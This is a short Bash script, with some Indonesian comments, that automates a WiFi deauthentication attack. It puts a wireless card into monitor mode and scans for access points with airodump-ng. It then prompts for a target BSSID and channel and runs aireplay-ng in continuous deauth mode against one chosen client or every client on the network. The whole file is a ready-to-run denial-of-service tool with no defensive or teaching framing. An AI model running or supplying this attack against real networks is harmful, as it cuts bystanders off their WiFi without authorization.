#!/bin/bash

# Ganti interface dengan interfacemu
IFACE="wlp3s0"

echo "[*] Activate monitor mode..."
sudo ip link set $IFACE down
sudo iw dev $IFACE set type monitor
sudo ip link set $IFACE up

echo "[*] Running airodump-ng (tekan Ctrl+C jika sudah menemukan target)..."
sleep 2
sudo airodump-ng $IFACE

echo
read -p "[?] Enter BSSID target (WiFi AP): " BSSID
read -p "[?] Enter channel (CH): " CH

echo
echo "[1] 1 Target"
echo "[2] All Target"
read -p "[?] Chose Attacking Mode (1/2): " MODE

if [ "$MODE" == "1" ]; then
    read -p "[?] Enter Client MAC address: " CLIENT
fi

echo "[*] Set channel to $CH..."
sudo iwconfig $IFACE channel $CH
sleep 1

echo
if [ "$MODE" == "1" ]; then
    echo "[*] Running Deauth Continuously to Target $CLIENT..."
    sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $IFACE
else
    echo "[*] Running Deauth Continuously to All Target..."
    sudo aireplay-ng --deauth 0 -a $BSSID $IFACE
fi

echo
read -p "[?] Would you like to set interface to normal mode? (y/n): " Answer

if [[ "$Answer" == "y" || "$Answer" == "Y" ]]; then
    echo "[*] Return to Normal mode..."
    sudo ip link set $IFACE down
    sudo iw dev $IFACE set type managed
    sudo ip link set $IFACE up
    echo "[✔] Interface Return to Normal mode."
else
    echo "[!] Interface Keep in Monitor mode."
fi

